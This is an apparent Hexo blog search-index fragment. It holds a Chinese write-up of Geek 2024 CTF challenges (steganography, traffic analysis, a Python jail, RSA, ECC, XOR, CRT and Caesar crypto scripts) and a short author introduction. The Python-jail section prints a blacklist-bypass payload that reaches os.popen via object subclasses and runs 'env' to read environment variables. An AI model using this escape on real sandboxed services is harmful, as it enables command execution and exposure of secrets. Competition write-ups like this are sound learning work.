href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h1><p>进入游戏，发现第一个刺都跳不过去<br>但是会生成很多存档文件:<br><img src="/2025/03/07/geek2024/iwanna.png"><br>随便将一个存档文件修改一下，保存再进入游戏<br>发现游戏进入了一个错误的地图，背景就是flag<br>手快截图即可</p><h1 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h1><p>libcimbar编码：<br><img src="/2025/03/07/geek2024/cimbar.png"><br><img src="/2025/03/07/geek2024/cimbar2.png"><br>对着对照表一个一个解密,发现第一行是<code>SYC&#123;</code><br>那么就是flag无疑了，将整张图片都decode<br>得到flag</p><h1 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h1><p>使用010editor打开<br>发现报异常<br>猜测是宽高被修改<br>将宽高都改成640，得到正确图片，获得flag<br><img src="/2025/03/07/geek2024/starven.jpg"></p><h1 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h1><p>流量分析题<br>但是直接使用记事本打开<br>搜索SYC<br>直接找到flag，在明文里<br>属于非预期了</p><h1 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h1><p>pyjail</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please check the blacklist and input your code</span><br><span class="line">[&#x27;import&#x27;, &#x27;os&#x27;, &#x27;breakpoint&#x27;, &#x27;input&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;help&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>模仿ssti的做法获得wrap_close:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>])</span><br></pre></td></tr></table></figure><p>接下来要获取popen,但引号被禁用，不妨用chr绕过,简单写个脚本快速获得payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">r_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    r_s += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(s[i])&#125;</span>)+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r_s)</span><br></pre></td></tr></table></figure><p>最终在环境变量中得到flag,payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)](<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">118</span>)).read())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;b101c81b-e232-4cdd-98fa-814c03772caa&#125;</span><br></pre></td></tr></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定参数</span></span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n= <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">c1= <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2= <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">e1e2= <span class="number">911</span>*<span class="number">967</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>): <span class="comment">#因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>: <span class="comment">#指定k小于1000</span></span><br><span class="line">        mk = c + n*k</span><br><span class="line">        flag, true1 = gmpy2.iroot(mk, e)  <span class="comment">#返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == true1:</span><br><span class="line">            <span class="comment"># print(libnum.n2s(int(flag)))</span></span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:         <span class="comment">#爆破可整除的e</span></span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c, e, n)</span><br><span class="line">        <span class="keyword">if</span> m1:  <span class="comment">#指定输出m1</span></span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure><h1 id="X0r"><a href="#X0r" class="headerlink" title="X0r"></a>X0r</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密值和预期的 `e2`</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2_expected = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向计算得到 `enc`</span></span><br><span class="line">e1 = e2_expected ^ f2</span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 `enc` 转换为字节</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 flag 以 b&#x27;SYC&#123;&#x27; 开头</span></span><br><span class="line">known_flag_start = <span class="string">b&#x27;SYC&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 `key` 的前四个字节</span></span><br><span class="line">key = xor(enc_bytes[:<span class="number">4</span>], known_flag_start)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;推导出的 key 前四个字节: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用该推导出的 key 前四个字节来解密 `flag`</span></span><br><span class="line">flag = xor(enc_bytes, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密得到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> solve_congruence</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的 p 和 c</span></span><br><span class="line">p = [<span class="number">1921232050179818686537976490035</span>, <span class="number">2050175089402111328155892746480</span>, <span class="number">1960810970476421389691930930824</span>, <span class="number">1797713136323968089432024221276</span>, <span class="number">2326915607951286191807212748022</span>]</span><br><span class="line">c = [<span class="number">1259284928311091851012441581576</span>, <span class="number">1501691203352712190922548476321</span>, <span class="number">1660842626322200346728249202857</span>, <span class="number">657314037433265072289232145909</span>, <span class="number">2056630082529583499248887436721</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理解</span></span><br><span class="line">congruences = [(ci, pi) <span class="keyword">for</span> ci, pi <span class="keyword">in</span> <span class="built_in">zip</span>(c, p)]</span><br><span class="line">x, _ = solve_congruence(*congruences)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x 是恢复的 m, 转回为 bytes 后得到 flag</span></span><br><span class="line">flag_bytes = long_to_bytes(x)[:-<span class="number">23</span>]  <span class="comment"># 去除多余的填充 \x01</span></span><br><span class="line"><span class="built_in">print</span>(flag_bytes)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">b = <span class="number">12824761259043751634610094689861000765081341921946160155432001001819005935812</span></span><br><span class="line">k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>,<span class="number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span>])</span><br><span class="line">c2 = E([<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span class="number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span>])</span><br><span class="line">cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br><span class="line">m = c1 - k * c2</span><br><span class="line">left = cipher_left//m[<span class="number">0</span>] </span><br><span class="line">right = cipher_right//m[<span class="number">1</span>] <span class="comment"># 不能转int或Integer型，不然结果为0，不知道为什么，很奇怪</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(left))+long_to_bytes(<span class="built_in">int</span>(right)))</span><br></pre></td></tr></table></figure><p>本题本地装环境有点麻烦，用的线上测试工具</p><h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><p>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):                   </span><br><span class="line">    <span class="keyword">if</span>(dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>) == <span class="number">0</span>:   </span><br><span class="line">            p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">            q=n//(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">            phi=(q-<span class="number">1</span>)*(p-<span class="number">1</span>)            </span><br><span class="line">            d=gp.invert(e,phi)         </span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)               </span><br><span class="line">           </span><br><span class="line"><span class="built_in">print</span>(m)                              </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h1 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h1><p>这个我真会，好吧<br>密码题里唯一一道能手搓的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, shift</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift_base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - shift_base - shift) % <span class="number">26</span> + shift_base)</span><br><span class="line">            decrypted.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">    decrypted_text = caesar_decrypt(ciphertext, shift)</span><br><span class="line">    <span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大家好啊我叫ivory</title>
      <link href="/2025/03/07/introduce/"/>
      <url>/2025/03/07/introduce/</url>
      
        <content type="html"><![CDATA[<h4 id="主业是打ctf，学习网安知识"><a href="#主业是打ctf，学习网安知识" class="headerlink" title="主业是打ctf，学习网安知识:"></a>主业是打ctf，学习网安知识:</h4><p><img src="/2025/03/07/introduce/ctf.png"></p><p>有人问我：“你是ctfer吗”<br>我觉得我是</p><h4 id="副业偶尔搞搞各种各样的开发"><a href="#副业偶尔搞搞各种各样的开发" class="headerlink" title="副业偶尔搞搞各种各样的开发"></a>副业偶尔搞搞各种各样的开发</h4><p>例如qqbot:</p><p><img src="/2025/03/07/introduce/qqbot.png"></p><h4 id="目前属于Syclover安全技术小组的新芽组"><a href="#目前属于Syclover安全技术小组的新芽组" class="headerlink" title="目前属于Syclover安全技术小组的新芽组"></a>目前属于<code>Syclover</code>安全技术小组的新芽组</h4><p>希望能继续跟大家一起学习进步</p><p><img src="/2025/03/07/introduce/syc.JPEG"></p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 介绍 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
